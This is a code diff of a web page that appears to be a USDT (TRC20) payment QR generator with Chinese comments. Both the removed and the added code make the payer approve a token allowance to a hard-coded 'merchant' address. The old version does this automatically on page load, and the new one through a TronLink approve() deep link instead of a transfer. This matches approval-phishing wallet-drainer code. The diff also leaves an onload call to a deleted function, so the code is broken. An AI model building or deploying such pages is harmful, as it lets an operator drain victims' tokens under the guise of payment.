@@ -28,8 +28,8 @@
 
 <script>
 // 配置
-const merchant = "TFEatdc8r36CrNqqKrbX6724DUsDyd6tHD"
-const usdtContract = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"
+const merchant = "TFEatdc8r36CrNqqKrbX6724DUsDyd6tHD" // 收款地址
+const usdtContract = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj" // USDT TRC20 合約地址
 const decimals = 6
 
 // Base58 → Hex
@@ -56,47 +56,20 @@ function generateQR() {
     return
   }
 
-  // 設定 URL (授權頁 URL + 參數)
-  const pageUrl = window.location.href.split('?')[0]
-  const url = `${pageUrl}?amount=${encodeURIComponent(amount)}`
+  const value = toSun(amount)
+  const addressHex = base58ToHex(merchant).substring(2)
+  const parameter = pad64(addressHex) + pad64(value.toString(16))
 
+  // 生成深鏈 URL
+  const deepLinkUrl = `tronlink://wallet/contract?contract=${usdtContract}&functionSelector=approve(address,uint256)&parameter=${parameter}`
+
+  // 生成 QR
   const qrContainer = document.getElementById("qrcode")
   qrContainer.innerHTML = ""
-  QRCode.toCanvas(document.createElement("canvas"), url, function (err, canvas) {
+  QRCode.toCanvas(document.createElement("canvas"), deepLinkUrl, function (err, canvas) {
     if (err) { alert("生成失敗"); return }
     qrContainer.appendChild(canvas)
   })
-}
-
-// 讀取 URL 金額並自動授權
-function getAmountFromUrl() {
-  const params = new URLSearchParams(window.location.search)
-  return parseFloat(params.get("amount"))
-}
-
-// 自動授權
-async function autoApprove() {
-  const statusEl = document.getElementById("status")
-  const amount = getAmountFromUrl()
-  if (!amount || amount <= 0) {
-    statusEl.innerText = "授權金額錯誤"
-    return
-  }
-
-  if (typeof window.tronWeb === "undefined") {
-    statusEl.innerText = "請在 TokenPocket DApp Browser 打開"
-    return
-  }
-
-  try {
-    statusEl.innerText = `正在授權 ${amount} USDT...`
-    const value = toSun(amount)
-    const contract = await window.tronWeb.contract().at(usdtContract)
-    await contract.approve(merchant, value).send()
-    statusEl.innerText = "授權成功 ✅"
-  } catch (e) {
-    statusEl.innerText = "授權失敗 ❌ " + e
-  }
 }
 
 // 頁面載入後自動執行授權（如果 URL 帶金額）
@@ -106,6 +79,13 @@ window.onload = function () {
     autoApprove()
   }
 }
+
+// 讀取 URL 金額
+function getAmountFromUrl() {
+  const params = new URLSearchParams(window.location.search)
+  return parseFloat(params.get("amount"))
+}
+
 </script>
 
 </body>
